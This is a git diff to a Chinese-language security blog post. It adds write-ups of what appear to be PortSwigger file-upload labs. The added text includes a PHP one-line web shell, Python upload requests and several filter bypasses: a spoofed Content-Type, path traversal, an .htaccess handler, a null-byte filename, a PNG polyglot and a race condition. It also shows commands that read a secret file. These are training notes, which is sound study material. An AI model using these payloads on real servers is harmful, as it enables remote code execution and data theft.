@@ -224,7 +224,6 @@ export default function Post() {
                 </script>
                 `}
             />
-
             <X.H1>SSRF: Server-side request forgery</X.H1>
             <X.H2>Ap: Basic SSRF against the local server</X.H2>
             <X.P>根据提示，发送请求：</X.P>
@@ -493,6 +492,106 @@ export default function Post() {
                 `}
             />
             <X.P>可以拿到管理员密码。</X.P>
+            <X.H1>File upload vulnerabilities</X.H1>
+            <X.H2>Ap: Remote code execution via web shell upload</X.H2>
+            <X.P>在修改头像表单上传一句话木马：</X.P>
+            <X.CodeBlock language="php" code='<?php system($_GET["cmd"]); ?>' />
+            <X.CodeBlock
+                language="python"
+                code={String.raw`
+                resp = s.post(url + "my-account/avatar", files={
+                    "avatar": ("exp.php", shell),  # (filename, binary)
+                }, data={"user": "wiener", "csrf": csrf_token})
+                `}
+            />
+            <X.P>访问`/files/avatars/exp.php?cmd=cat%20/home/carlos/secret`拿secret。</X.P>
+            <X.H2>Ap: Web shell upload via Content-Type restriction bypass</X.H2>
+            <X.P>伪造一个Content-Type：</X.P>
+            <X.CodeBlock
+                language="python"
+                code={String.raw`
+                resp = s.post(url + "my-account/avatar", files={
+                    "avatar": ("exp.php", shell, "image/png"),  # (filename, binary, content_type)
+                }, data={"user": "wiener", "csrf": csrf_token})
+                `}
+            />
+            <X.H2>Pr: Web shell upload via path traversal</X.H2>
+            <X.CodeBlock
+                language="python"
+                code={String.raw`
+                resp = s.post(url + "my-account/avatar", files={
+                    # ../exp.php
+                    "avatar": ("%2e%2e%2fexp.php", shell),  # (filename, binary)
+                }, data={"user": "wiener", "csrf": csrf_token})
+                `}
+            />
+            <X.P>需要在上一级目录也就是`/files/exp.php?cmd=cat%20/home/carlos/secret`中得到secret。</X.P>
+            <X.H2>Pr: Web shell upload via extension blacklist bypass</X.H2>
+            <X.P>黑名单屏蔽了`.php`，但没有包含`.htaccess`，先上传一个`.htaccess`文件，内容为：</X.P>
+            <X.CodeBlock language="text" code="AddType application/x-httpd-php .abcde" />
+            <X.P>让服务端将`.abcde`后缀当作PHP文件解析，然后以文件名为`exp.abcde`上传后门。</X.P>
+            <X.H2>Pr: Web shell upload via obfuscated file extension</X.H2>
+            <X.CodeBlock
+                language="python"
+                code={String.raw`
+                resp = s.post(url + "my-account/avatar", files={
+                    "avatar": ("exp.php\x00.jpg", shell),  # (filename, binary)
+                }, data={"user": "wiener", "csrf": csrf_token})
+                `}
+            />
+            <X.H2>Pr: Remote code execution via polyglot web shell upload</X.H2>
+            <X.P>服务端验证上传的文件内容是否是合法的图片。这里找到一个@网站[https://onlinepngtools.com/generate-1x1-png]@生成一个1x1的PNG文件，再拼接后门的文本内容，以`.php`后缀上传：</X.P>
+            <X.CodeBlock
+                language="python"
+                code={String.raw`
+                png_1x1 = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAAtJREFUGFdjYAACAAAFAAGq1chRAAAAAElFTkSuQmCC"
+                shell = base64.b64decode(png_1x1) + b'###<?php system($_GET["cmd"]); ?>'
+
+                # ...
+
+                resp = s.post(url + "my-account/avatar", files={
+                    "avatar": ("exp.php", shell),  # (filename, binary)
+                }, data={"user": "wiener", "csrf": csrf_token})
+                `}
+            />
+            <X.H2>Ex: Web shell upload via race condition</X.H2>
+            <X.P>题目给了服务端代码：</X.P>
+            <X.CodeBlock
+                language="php"
+                code={String.raw`
+                <?php
+                $target_dir = "avatars/";
+                $target_file = $target_dir . $_FILES["avatar"]["name"];
+
+                // temporary move
+                move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);
+
+                if (checkViruses($target_file) && checkFileType($target_file)) {
+                    echo "The file ". htmlspecialchars( $target_file). " has been uploaded.";
+                } else {
+                    unlink($target_file);
+                    echo "Sorry, there was an error uploading your file.";
+                    http_response_code(403);
+                }
+
+                function checkViruses($fileName) {
+                    // checking for viruses
+                    ...
+                }
+
+                function checkFileType($fileName) {
+                    $imageFileType = strtolower(pathinfo($fileName,PATHINFO_EXTENSION));
+                    if($imageFileType != "jpg" && $imageFileType != "png") {
+                        echo "Sorry, only JPG & PNG files are allowed\n";
+                        return false;
+                    } else {
+                        return true;
+                    }
+                }
+                ?>
+                `}
+            />
+            <X.P>问题出现在先上传、再判断、后删除的逻辑，如果判断花费时间较长，则在此期间并发访问后门，有几率得到代码执行的结果。本题需要同时在Burp Intruder中同时重放上传后门和访问后门两个请求。</X.P>
             <X.H1>JWT</X.H1>
             <X.H2>笔记</X.H2>
             <X.Uli>
